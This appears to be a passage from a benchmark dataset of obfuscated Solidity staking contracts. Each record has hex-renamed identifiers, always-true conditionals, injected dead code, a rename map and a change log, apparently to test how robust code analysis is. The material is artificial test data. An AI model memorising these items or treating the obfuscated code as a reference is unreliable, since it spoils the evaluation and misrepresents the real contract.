      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n    \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\n\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\n\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\n\n/// @notice Events emitted by the staking contract.\ninterface StakingEvents {\n    /// @notice Emitted when a user stakes ETH and receives mETH.\n    event Staked(address indexed _0x818463, uint256 _0x7f6b37, uint256 _0xb60c38);\n\n    /// @notice Emitted when a user unstakes mETH in exchange for ETH.\n    event UnstakeRequested(uint256 indexed _0x8b86dd, address indexed _0x818463, uint256 _0x7f6b37, uint256 _0x741278);\n\n    /// @notice Emitted when a user claims their unstake request.\n    event UnstakeRequestClaimed(uint256 indexed _0x8b86dd, address indexed _0x818463);\n\n    /// @notice Emitted when a validator has been initiated.\n    event ValidatorInitiated(bytes32 indexed _0x8b86dd, uint256 indexed _0xf43133, bytes _0x72c46a, uint256 _0x8f40bc);\n\n    /// @notice Emitted when the protocol has allocated ETH to the UnstakeRequestsManager.\n    event AllocatedETHToUnstakeRequestsManager(uint256 _0x4b09f6);\n\n    /// @notice Emitted when the protocol has allocated ETH to use for deposits into the deposit contract.\n    event AllocatedETHToDeposits(uint256 _0x4b09f6);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceived(uint256 _0x4b09f6);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceivedFromLiquidityBuffer(uint256 _0x4b09f6);\n\n    /// @notice Emitted when the protocol has allocated ETH to the liquidity buffer.\n    event AllocatedETHToLiquidityBuffer(uint256 _0x4b09f6);\n}\n\n/// @title Staking\n/// @notice Manages stake and unstake requests by users.\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\n    // Errors.\n    error DoesNotReceiveETH();\n    error InvalidConfiguration();\n    error MaximumValidatorDepositExceeded();\n    error MaximumMETHSupplyExceeded();\n    error MinimumStakeBoundNotSatisfied();\n    error MinimumUnstakeBoundNotSatisfied();\n    error MinimumValidatorDepositNotSatisfied();\n    error NotEnoughDepositETH();\n    error NotEnoughUnallocatedETH();\n    error NotReturnsAggregator();\n    error NotLiquidityBuffer();\n    error NotUnstakeRequestsManager();\n    error Paused();\n    error PreviouslyUsedValidator();\n    error ZeroAddress();\n    error InvalidDepositRoot(bytes32);\n    error StakeBelowMinimumMETHAmount(uint256 _0x5d8cac, uint256 _0x58c3ec);\n    error UnstakeBelowMinimumETHAmount(uint256 _0x7f6b37, uint256 _0x58c3ec);\n\n    error InvalidWithdrawalCredentialsWrongLength(uint256);\n    error InvalidWithdrawalCredentialsNotETH1(bytes12);\n    error InvalidWithdrawalCredentialsWrongAddress(address);\n\n    bytes32 public constant STAKING_MANAGER_ROLE = _0xc4219c(\"STAKING_MANAGER_ROLE\");\n    bytes32 public constant ALLOCATOR_SERVICE_ROLE = _0xc4219c(\"ALLOCATER_SERVICE_ROLE\");\n    bytes32 public constant INITIATOR_SERVICE_ROLE = _0xc4219c(\"INITIATOR_SERVICE_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = _0xc4219c(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_ROLE = _0xc4219c(\"STAKING_ALLOWLIST_ROLE\");\n    bytes32 public constant TOP_UP_ROLE = _0xc4219c(\"TOP_UP_ROLE\");\n\n    struct ValidatorParams {\n        uint256 _0xf43133;\n        uint256 _0x40bcdf;\n        bytes _0x72c46a;\n        bytes _0x37001e;\n        bytes _0xf48043;\n        bytes32 _0x39a87c;\n    }\n\n    mapping(bytes _0x72c46a => bool _0xc77b6a) public _0xdf7521;\n    uint256 public _0x9f8f4d;\n    uint256 public _0x0a9523;\n    uint256 public _0xe72a74;\n    uint256 public _0x32c29d;\n    uint256 public _0x3e7ad4;\n    uint256 public _0xceb265;\n    uint16 public _0x511d3c;\n    uint16 internal constant _0xc361d5 = 10_000;\n    uint16 internal constant _0x5e6e5c = _0xc361d5 / 10;\n    uint256 public _0x6f8a3f;\n    uint256 public _0x348a0d;\n    IDepositContract public _0x371936;\n    IMETH public _0x7053ff;\n    IOracleReadRecord public _0x7a3665;\n    IPauserRead public _0xb4e9d4;\n    IUnstakeRequestsManager public _0x039d27;\n    address public _0xb07623;\n    address public _0xbbc35c;\n    bool public _0xde0528;\n    uint256 public _0x38d701;\n    uint256 public _0x27a0f0;\n    ILiquidityBuffer public _0x20e5ff;\n\n    struct Init {\n        address _0xeb8ad3;\n        address _0x503bba;\n        address _0xc0f48a;\n        address _0x4a83ed;\n        address _0xbbc35c;\n        address _0xb07623;\n        IMETH _0x7053ff;\n        IDepositContract _0x371936;\n        IOracleReadRecord _0x7a3665;\n        IPauserRead _0xb4e9d4;\n        IUnstakeRequestsManager _0x039d27;\n    }\n\n    constructor() {\n        _0x886cbd();\n    }\n\n    function _0x675be8(Init memory _0x5c80ba) external _0xd55fee {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        __AccessControlEnumerable_init();\n\n        _0xc03abf(DEFAULT_ADMIN_ROLE, _0x5c80ba._0xeb8ad3);\n        _0xc03abf(STAKING_MANAGER_ROLE, _0x5c80ba._0x503bba);\n        _0xc03abf(ALLOCATOR_SERVICE_ROLE, _0x5c80ba._0xc0f48a);\n        _0xc03abf(INITIATOR_SERVICE_ROLE, _0x5c80ba._0x4a83ed);\n\n        _0x022271(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n        _0x022271(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\n\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x7053ff = _0x5c80ba._0x7053ff; }\n        if (1 == 1) { _0x371936 = _0x5c80ba._0x371936; }\n        if (1 == 1) { _0x7a3665 = _0x5c80ba._0x7a3665; }\n        if (block.timestamp > 0) { _0xb4e9d4 = _0x5c80ba._0xb4e9d4; }\n        if (block.timestamp > 0) { _0xbbc35c = _0x5c80ba._0xbbc35c; }\n        _0x039d27 = _0x5c80ba._0x039d27;\n        _0xb07623 = _0x5c80ba._0xb07623;\n\n        _0x3e7ad4 = 0.1 ether;\n        _0xceb265 = 0.01 ether;\n        if (true) { _0x6f8a3f = 32 ether; }\n        _0x348a0d = 32 ether;\n        _0xde0528 = true;\n        _0x38d701 = block.number;\n        if (1 == 1) { _0x27a0f0 = 1024 ether; }\n    }\n\n    function _0xb15135(ILiquidityBuffer _0x40c46e) public _0x665fb6(2) {\n        bool _flag3 = false;\n        // Placeholder for future logic\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x20e5ff = _0x40c46e; }\n    }\n\n    function _0x0d4286(uint256 _0xee65af) external payable {\n        if (_0xb4e9d4._0x1b1b01()) {\n            revert Paused();\n        }\n\n        if (_0xde0528) {\n            _0x486e47(STAKING_ALLOWLIST_ROLE);\n        }\n\n        if (msg.value < _0x3e7ad4) {\n            revert MinimumStakeBoundNotSatisfied();\n        }\n\n        uint256 _0x981f96 = _0x09a99e(msg.value);\n        if (_0x981f96 + _0x7053ff._0x74c9de() > _0x27a0f0) {\n            revert MaximumMETHSupplyExceeded();\n        }\n        if (_0x981f96 < _0xee65af) {\n            revert StakeBelowMinimumMETHAmount(_0x981f96, _0xee65af);\n        }\n\n        _0xe72a74 += msg.value;\n\n        emit Staked(msg.sender, msg.value, _0x981f96);\n        _0x7053ff._0x649f3f(msg.sender, _0x981f96);\n    }\n\n    function _0xf83476(uint128 _0x5d8cac, uint128 _0xc2409e) external returns (uint256) {\n        return _0xec9959(_0x5d8cac, _0xc2409e);\n    }\n\n    function _0xf3491a(\n        uint128 _0x5d8cac,\n        uint128 _0xc2409e,\n        uint256 _0x77c32d,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256) {\n        SafeERC20Upgradeable._0x57f821(_0x7053ff, msg.sender, address(this), _0x5d8cac, _0x77c32d, v, r, s);\n        return _0xec9959(_0x5d8cac, _0xc2409e);\n    }\n\n    function _0xec9959(uint128 _0x5d8cac, uint128 _0xc2409e) internal returns (uint256) {\n        if (_0xb4e9d4._0xf636e7()) {\n            revert Paused();\n        }\n\n        if (_0x5d8cac < _0xceb265) {\n            revert MinimumUnstakeBoundNotSatisfied();\n        }\n\n        uint128 _0x7f6b37 = uint128(_0xd22b90(_0x5d8cac));\n        if (_0x7f6b37 < _0xc2409e) {\n            revert UnstakeBelowMinimumETHAmount(_0x7f6b37, _0xc2409e);\n        }\n\n        uint256 _0x7cbfe0 =\n            _0x039d27._0x076089({_0xc6e575: msg.sender, _0x741278: _0x5d8cac, _0x7a9832: _0x7f6b37});\n        emit UnstakeRequested({_0x8b86dd: _0x7cbfe0, _0x818463: msg.sender, _0x7f6b37: _0x7f6b37, _0x741278: _0x5d8cac});\n\n        SafeERC20Upgradeable._0xb4983d(_0x7053ff, msg.sender, address(_0x039d27), _0x5d8cac);\n\n        return _0x7cbfe0;\n    }\n\n    function _0x09a99e(uint256 _0x7f6b37) public view returns (uint256) {\n        if (_0x7053ff._0x74c9de() == 0) {\n            return _0x7f6b37;\n        }\n        uint256 _0x5b795b = Math._0xc3a67f(\n            _0xaa348c(), _0xc361d5 + _0x511d3c, _0xc361d5\n        );\n        return Math._0xc3a67f(_0x7f6b37, _0x7053ff._0x74c9de(), _0x5b795b);\n    }\n\n    function _0xd22b90(uint256 _0xb60c38) public view returns (uint256) {\n        if (_0x7053ff._0x74c9de() == 0) {\n            return _0xb60c38;\n        }\n        return Math._0xc3a67f(_0xb60c38, _0xaa348c(), _0x7053ff._0x74c9de());\n    }\n\n    function _0xaa348c() public view returns (uint256) {\n        OracleRecord memory _0x45378f = _0x7a3665._0x19e369();\n        uint256 _0xa05258 = 0;\n        _0xa05258 += _0xe72a74;\n        _0xa05258 += _0x32c29d;\n        _0xa05258 += _0x9f8f4d - _0x45378f._0x416c9c;\n        _0xa05258 += _0x45378f._0xb4f5a8;\n        _0xa05258 += _0x20e5ff._0x0a5f11();\n        _0xa05258 -= _0x20e5ff._0x953396();\n        _0xa05258 += _0x039d27.balance();\n        return _0xa05258;\n    }\n\n    function _0xe8bfa0() external payable _0x506afa {\n        emit ReturnsReceived(msg.value);\n        _0xe72a74 += msg.value;\n    }\n\n    function _0xbaff44() external payable _0x7b2ffc {\n        emit ReturnsReceivedFromLiquidityBuffer(msg.value);\n        _0xe72a74 += msg.value;\n    }\n\n    modifier _0x506afa() {\n        if (msg.sender != _0xbbc35c) {\n            revert NotReturnsAggregator();\n        }\n        _;\n    }\n\n    modifier _0x7b2ffc() {\n        if (msg.sender != address(_0x20e5ff)) {\n            revert NotLiquidityBuffer();\n        }\n        _;\n    }\n\n    modifier _0xbe76e3() {\n        if (msg.sender != address(_0x039d27)) {\n            revert NotUnstakeRequestsManager();\n        }\n        _;\n    }\n\n    modifier _0xf95f4f(address _0xb8455b) {\n        if (_0xb8455b == address(0)) {\n            revert ZeroAddress();\n        }\n        _;\n    }\n\n    receive() external payable {\n        revert DoesNotReceiveETH();\n    }\n\n    fallback() external payable {\n        revert DoesNotReceiveETH();\n    }\n}",
      "rename_map": {
        "receiveReturnsFromLiquidityBuffer": "_0xbaff44",
        "isUnstakeRequestsAndClaimsPaused": "_0xf636e7",
        "cumulativeProcessedDepositAmount": "_0x416c9c",
        "_MAX_EXCHANGE_ADJUSTMENT_RATE": "_0x5e6e5c",
        "currentTotalValidatorBalance": "_0xb4f5a8",
        "onlyUnstakeRequestsManager": "_0xbe76e3",
        "totalDepositedInValidators": "_0x9f8f4d",
        "initializationBlockNumber": "_0x38d701",
        "_BASIS_POINTS_DENOMINATOR": "_0xc361d5",
        "unstakeRequestWithPermit": "_0xf3491a",
        "adjustedTotalControlled": "_0x5b795b",
        "allocatedETHForDeposits": "_0x32c29d",
        "unstakeRequestsManager": "_0x039d27",
        "exchangeAdjustmentRate": "_0x511d3c",
        "numInitiatedValidators": "_0x0a9523",
        "withdrawalCredentials": "_0x37001e",
        "onlyReturnsAggregator": "_0x506afa",
        "_disableInitializers": "_0x886cbd",
        "maximumDepositAmount": "_0x348a0d",
        "minimumDepositAmount": "_0x6f8a3f",
        "minimumUnstakeBound": "_0xceb265",
        "getAvailableBalance": "_0x0a5f11",
        "onlyLiquidityBuffer": "_0x7b2ffc",
        "isStakingAllowlist": "_0xde0528",
        "cumulativeDrawdown": "_0x953396",
        "minimumStakeBound": "_0x3e7ad4",
        "maximumMETHSupply": "_0x27a0f0",
        "returnsAggregator": "_0xbbc35c",
        "withdrawalWallet": "_0xb07623",
        "safeTransferFrom": "_0xb4983d",
        "allocatorService": "_0xc0f48a",
        "initiatorService": "_0x4a83ed",
        "totalControlled": "_0xaa348c",
        "amountDeposited": "_0x8f40bc",
        "liquidityBuffer": "_0x20e5ff",
        "depositContract": "_0x371936",
        "expectedMinimum": "_0x58c3ec",
        "_unstakeRequest": "_0xec9959",
        "isStakingPaused": "_0x1b1b01",
        "depositDataRoot": "_0x39a87c",
        "unallocatedETH": "_0xe72a74",
        "notZeroAddress": "_0xf95f4f",
        "receiveReturns": "_0xe8bfa0",
        "usedValidators": "_0xdf7521",
        "mETHMintAmount": "_0x981f96",
        "unstakeRequest": "_0xf83476",
        "minMETHAmount": "_0xee65af",
        "depositAmount": "_0x40bcdf",
        "_setRoleAdmin": "_0x022271",
        "reinitializer": "_0x665fb6",
        "latestRecord": "_0x19e369",
        "ethRequested": "_0x7a9832",
        "minETHAmount": "_0xc2409e",
        "initializeV2": "_0xb15135",
        "totalSupply": "_0x74c9de",
        "initializer": "_0xd55fee",
        "_checkRole": "_0x486e47",
        "mETHAmount": "_0xb60c38",
        "operatorID": "_0xf43133",
        "methAmount": "_0x5d8cac",
        "_grantRole": "_0xc03abf",
        "mETHLocked": "_0x741278",
        "safePermit": "_0x57f821",
        "initialize": "_0x675be8",
        "requestID": "_0x7cbfe0",
        "signature": "_0xf48043",
        "ethToMETH": "_0x09a99e",
        "requester": "_0xc6e575",
        "mETHToETH": "_0xd22b90",
        "keccak256": "_0xc4219c",
        "ethAmount": "_0x7f6b37",
        "deadline": "_0x77c32d",
        "manager": "_0x503bba",
        "staker": "_0x818463",
        "exists": "_0xc77b6a",
        "mulDiv": "_0xc3a67f",
        "record": "_0x45378f",
        "pauser": "_0xb4e9d4",
        "oracle": "_0x7a3665",
        "create": "_0x076089",
        "amount": "_0x4b09f6",
        "pubkey": "_0x72c46a",
        "admin": "_0xeb8ad3",
        "total": "_0xa05258",
        "stake": "_0x0d4286",
        "addr": "_0xb8455b",
        "init": "_0x5c80ba",
        "mETH": "_0x7053ff",
        "mint": "_0x649f3f",
        "id": "_0x8b86dd",
        "lb": "_0x40c46e"
      },
      "changes": [
        "Renamed 91 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_028",
      "transformed_id": "ss_l4_medium_sn_gs_028",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n    \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\n\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\n\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\n\n/// @notice Events emitted by the staking contract.\ninterface StakingEvents {\n    /// @notice Emitted when a user stakes ETH and receives mETH.\n    event Staked(address indexed _0xf36c60, uint256 _0x53c769, uint256 _0xc56d11);\n\n    /// @notice Emitted when a user unstakes mETH in exchange for ETH.\n    event UnstakeRequested(uint256 indexed _0xb01550, address indexed _0xf36c60, uint256 _0x53c769, uint256 _0x9490a4);\n\n    /// @notice Emitted when a user claims their unstake request.\n    event UnstakeRequestClaimed(uint256 indexed _0xb01550, address indexed _0xf36c60);\n\n    /// @notice Emitted when a validator has been initiated.\n    event ValidatorInitiated(bytes32 indexed _0xb01550, uint256 indexed _0x837c32, bytes _0x6ea894, uint256 _0x88c0f7);\n\n    /// @notice Emitted when the protocol has allocated ETH to the UnstakeRequestsManager.\n    event AllocatedETHToUnstakeRequestsManager(uint256 _0xb7ef25);\n\n    /// @notice Emitted when the protocol has allocated ETH to use for deposits into the deposit contract.\n    event AllocatedETHToDeposits(uint256 _0xb7ef25);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceived(uint256 _0xb7ef25);\n\n    /// @notice Emitted when the protocol has received returns from the returns aggregator.\n    event ReturnsReceivedFromLiquidityBuffer(uint256 _0xb7ef25);\n\n    /// @notice Emitted when the protocol has allocated ETH to the liquidity buffer.\n    event AllocatedETHToLiquidityBuffer(uint256 _0xb7ef25);\n}\n\n/// @title Staking\n/// @notice Manages stake and unstake requests by users.\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\n    // Errors.\n    error DoesNotReceiveETH();\n    error InvalidConfiguration();\n    error MaximumValidatorDepositExceeded();\n    error MaximumMETHSupplyExceeded();\n    error MinimumStakeBoundNotSatisfied();\n    error MinimumUnstakeBoundNotSatisfied();\n    error MinimumValidatorDepositNotSatisfied();\n    error NotEnoughDepositETH();\n    error NotEnoughUnallocatedETH();\n    error NotReturnsAggregator();\n    error NotLiquidityBuffer();\n    error NotUnstakeRequestsManager();\n    error Paused();\n    error PreviouslyUsedValidator();\n    error ZeroAddress();\n    error InvalidDepositRoot(bytes32);\n    error StakeBelowMinimumMETHAmount(uint256 _0x90fba2, uint256 _0xfefec6);\n    error UnstakeBelowMinimumETHAmount(uint256 _0x53c769, uint256 _0xfefec6);\n\n    error InvalidWithdrawalCredentialsWrongLength(uint256);\n    error InvalidWithdrawalCredentialsNotETH1(bytes12);\n    error InvalidWithdrawalCredentialsWrongAddress(address);\n\n    bytes32 public constant STAKING_MANAGER_ROLE = _0x20d2bb(\"STAKING_MANAGER_ROLE\");\n    bytes32 public constant ALLOCATOR_SERVICE_ROLE = _0x20d2bb(\"ALLOCATER_SERVICE_ROLE\");\n    bytes32 public constant INITIATOR_SERVICE_ROLE = _0x20d2bb(\"INITIATOR_SERVICE_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = _0x20d2bb(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\n    bytes32 public constant STAKING_ALLOWLIST_ROLE = _0x20d2bb(\"STAKING_ALLOWLIST_ROLE\");\n    bytes32 public constant TOP_UP_ROLE = _0x20d2bb(\"TOP_UP_ROLE\");\n\n    struct ValidatorParams {\n        uint256 _0x837c32;\n        uint256 _0xd71f78;\n        bytes _0x6ea894;\n        bytes _0xc80eeb;\n        bytes _0xa1600f;\n        bytes32 _0xa5e01e;\n    }\n\n    mapping(bytes _0x6ea894 => bool _0x9a7831) public _0x52dc92;\n    uint256 public _0xf9f29f;\n    uint256 public _0x79911f;\n    uint256 public _0xf47e45;\n    uint256 public _0xfaab63;\n    uint256 public _0x5a1cf8;\n    uint256 public _0x38d74b;\n    uint16 public _0x141102;\n    uint16 internal constant _0xd2fec7 = 10_000;\n    uint16 internal constant _0xff66c8 = _0xd2fec7 / 10;\n    uint256 public _0x3afe15;\n    uint256 public _0x5b4bf2;\n    IDepositContract public _0x9b4523;\n    IMETH public _0x49bbf9;\n    IOracleReadRecord public _0x801ff9;\n    IPauserRead public _0x4eb005;\n    IUnstakeRequestsManager public _0x4a634b;\n    address public _0x6ddf14;\n    address public _0x69e462;\n    bool public _0xb52958;\n    uint256 public _0x61ee18;\n    uint256 public _0x40fe77;\n    ILiquidityBuffer public _0x502a5b;\n\n    struct Init {\n        address _0x140228;\n        address _0x3f6c35;\n        address _0x593759;\n        address _0x151608;\n        address _0x69e462;\n        address _0x6ddf14;\n        IMETH _0x49bbf9;\n        IDepositContract _0x9b4523;\n        IOracleReadRecord _0x801ff9;\n        IPauserRead _0x4eb005;\n        IUnstakeRequestsManager _0x4a634b;\n    }\n\n    constructor() {\n        _0x766ee4();\n    }\n\n    function _0xc4c60b(Init memory _0x4ab01d) external _0x0b4734 {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        __AccessControlEnumerable_init();\n\n        _0x4d13d6(DEFAULT_ADMIN_ROLE, _0x4ab01d._0x140228);\n        _0x4d13d6(STAKING_MANAGER_ROLE, _0x4ab01d._0x3f6c35);\n        _0x4d13d6(ALLOCATOR_SERVICE_ROLE, _0x4ab01d._0x593759);\n        _0x4d13d6(INITIATOR_SERVICE_ROLE, _0x4ab01d._0x151608);\n\n        _0xa43946(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n        _0xa43946(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\n\n        _0x49bbf9 = _0x4ab01d._0x49bbf9;\n        _0x9b4523 = _0x4ab01d._0x9b4523;\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x801ff9 = _0x4ab01d._0x801ff9; }\n        _0x4eb005 = _0x4ab01d._0x4eb005;\n        _0x69e462 = _0x4ab01d._0x69e462;\n        if (true) { _0x4a634b = _0x4ab01d._0x4a634b; }\n        _0x6ddf14 = _0x4ab01d._0x6ddf14;\n\n        _0x5a1cf8 = 0.1 ether;\n        if (block.timestamp > 0) { _0x38d74b = 0.01 ether; }\n        if (1 == 1) { _0x3afe15 = 32 ether; }\n        _0x5b4bf2 = 32 ether;\n        _0xb52958 = true;\n        if (gasleft() > 0) { _0x61ee18 = block.number; }\n        _0x40fe77 = 1024 ether;\n    }\n\n    function _0x7b5ec3(ILiquidityBuffer _0xeeed28) public _0xb924c6(2) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        _0x502a5b = _0xeeed28;\n    }\n\n    function _0x281b68(uint256 _0x878d12) external payable {\n        if (_0x4eb005._0x798145()) {\n            revert Paused();\n        }\n\n        if (_0xb52958) {\n            _0x3d4cbd(STAKING_ALLOWLIST_ROLE);\n        }\n\n        if (msg.value < _0x5a1cf8) {\n            revert MinimumStakeBoundNotSatisfied();\n        }\n\n        uint256 _0x9ee493 = _0xfe089e(msg.value);\n        if (_0x9ee493 + _0x49bbf9._0x0c8146() > _0x40fe77) {\n            revert MaximumMETHSupplyExceeded();\n        }\n        if (_0x9ee493 < _0x878d12) {\n            revert StakeBelowMinimumMETHAmount(_0x9ee493, _0x878d12);\n        }\n\n        _0xf47e45 += msg.value;\n\n        emit Staked(msg.sender, msg.value, _0x9ee493);\n        _0x49bbf9._0x7afe00(msg.sender, _0x9ee493);\n    }\n\n    function _0xf15e2b(uint128 _0x90fba2, uint128 _0x047864) external returns (uint256) {\n        return _0x34fe73(_0x90fba2, _0x047864);\n    }\n\n    function _0x947e75(\n        uint128 _0x90fba2,\n        uint128 _0x047864,\n        uint256 _0x924a31,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256) {\n        SafeERC20Upgradeable._0x2507b4(_0x49bbf9, msg.sender, address(this), _0x90fba2, _0x924a31, v, r, s);\n        return _0x34fe73(_0x90fba2, _0x047864);\n    }\n\n    function _0x34fe73(uint128 _0x90fba2, uint128 _0x047864) internal returns (uint256) {\n        if (_0x4eb005._0x2bceba()) {\n            revert Paused();\n        }\n\n        if (_0x90fba2 < _0x38d74b) {\n            revert MinimumUnstakeBoundNotSatisfied();\n        }\n\n        uint128 _0x53c769 = uint128(_0x704398(_0x90fba2));\n        if (_0x53c769 < _0x047864) {\n            revert UnstakeBelowMinimumETHAmount(_0x53c769, _0x047864);\n        }\n\n        uint256 _0x5b1979 =\n            _0x4a634b._0x8a24c1({_0xff1346: msg.sender, _0x9490a4: _0x90fba2, _0x58e310: _0x53c769});\n        emit UnstakeRequested({_0xb01550: _0x5b1979, _0xf36c60: msg.sender, _0x53c769: _0x53c769, _0x9490a4: _0x90fba2});\n\n        SafeERC20Upgradeable._0xc7ef98(_0x49bbf9, msg.sender, address(_0x4a634b), _0x90fba2);\n\n        return _0x5b1979;\n    }\n\n    function _0xfe089e(uint256 _0x53c769) public view returns (uint256) {\n        if (_0x49bbf9._0x0c8146() == 0) {\n            return _0x53c769;\n        }\n        uint256 _0xd97587 = Math._0x65932d(\n            _0x99d03a(), _0xd2fec7 + _0x141102, _0xd2fec7\n        );\n        return Math._0x65932d(_0x53c769, _0x49bbf9._0x0c8146(), _0xd97587);\n    }\n\n    function _0x704398(uint256 _0xc56d11) public view returns (uint256) {\n        if (_0x49bbf9._0x0c8146() == 0) {\n            return _0xc56d11;\n        }\n        return Math._0x65932d(_0xc56d11, _0x99d03a(), _0x49bbf9._0x0c8146());\n    }\n\n    function _0x99d03a() public view returns (uint256) {\n        OracleRecord memory _0x70f217 = _0x801ff9._0x3473ac();\n        uint256 _0xa78a3b = 0;\n        _0xa78a3b += _0xf47e45;\n        _0xa78a3b += _0xfaab63;\n        _0xa78a3b += _0xf9f29f - _0x70f217._0x3bbaee;\n        _0xa78a3b += _0x70f217._0x48880b;\n        _0xa78a3b += _0x502a5b._0x2e0c12();\n        _0xa78a3b -= _0x502a5b._0x601639();\n        _0xa78a3b += _0x4a634b.balance();\n        return _0xa78a3b;\n    }\n\n    function _0x440dbf() external payable _0xe8df33 {\n        emit ReturnsReceived(msg.value);\n        _0xf47e45 += msg.value;\n    }\n\n    function _0x129ab7() external payable _0xa708a4 {\n        emit ReturnsReceivedFromLiquidityBuffer(msg.value);\n        _0xf47e45 += msg.value;\n    }\n\n    modifier _0xe8df33() {\n        if (msg.sender != _0x69e462) {\n            revert NotReturnsAggregator();\n        }\n        _;\n    }\n\n    modifier _0xa708a4() {\n        if (msg.sender != address(_0x502a5b)) {\n            revert NotLiquidityBuffer();\n        }\n        _;\n    }\n\n    modifier _0x932835() {\n        if (msg.sender != address(_0x4a634b)) {\n            revert NotUnstakeRequestsManager();\n        }\n        _;\n    }\n\n    modifier _0xd0ec9b(address _0x9fda54) {\n        if (_0x9fda54 == address(0)) {\n            revert ZeroAddress();\n        }\n        _;\n    }\n\n    receive() external payable {\n        revert DoesNotReceiveETH();\n    }\n\n    fallback() external payable {\n        revert DoesNotReceiveETH();\n    }\n}",
      "rename_map": {
        "receiveReturnsFromLiquidityBuffer": "_0x129ab7",
        "isUnstakeRequestsAndClaimsPaused": "_0x2bceba",
        "cumulativeProcessedDepositAmount": "_0x3bbaee",
        "_MAX_EXCHANGE_ADJUSTMENT_RATE": "_0xff66c8",
        "currentTotalValidatorBalance": "_0x48880b",
        "onlyUnstakeRequestsManager": "_0x932835",
        "totalDepositedInValidators": "_0xf9f29f",
        "initializationBlockNumber": "_0x61ee18",
        "_BASIS_POINTS_DENOMINATOR": "_0xd2fec7",
        "unstakeRequestWithPermit": "_0x947e75",
        "adjustedTotalControlled": "_0xd97587",
        "allocatedETHForDeposits": "_0xfaab63",
        "unstakeRequestsManager": "_0x4a634b",
        "exchangeAdjustmentRate": "_0x141102",
        "numInitiatedValidators": "_0x79911f",
        "withdrawalCredentials": "_0xc80eeb",
        "onlyReturnsAggregator": "_0xe8df33",
        "_disableInitializers": "_0x766ee4",
        "maximumDepositAmount": "_0x5b4bf2",
        "minimumDepositAmount": "_0x3afe15",
        "minimumUnstakeBound": "_0x38d74b",
        "getAvailableBalance": "_0x2e0c12",
        "onlyLiquidityBuffer": "_0xa708a4",
        "isStakingAllowlist": "_0xb52958",
        "cumulativeDrawdown": "_0x601639",
        "minimumStakeBound": "_0x5a1cf8",
        "maximumMETHSupply": "_0x40fe77",
        "returnsAggregator": "_0x69e462",
        "withdrawalWallet": "_0x6ddf14",
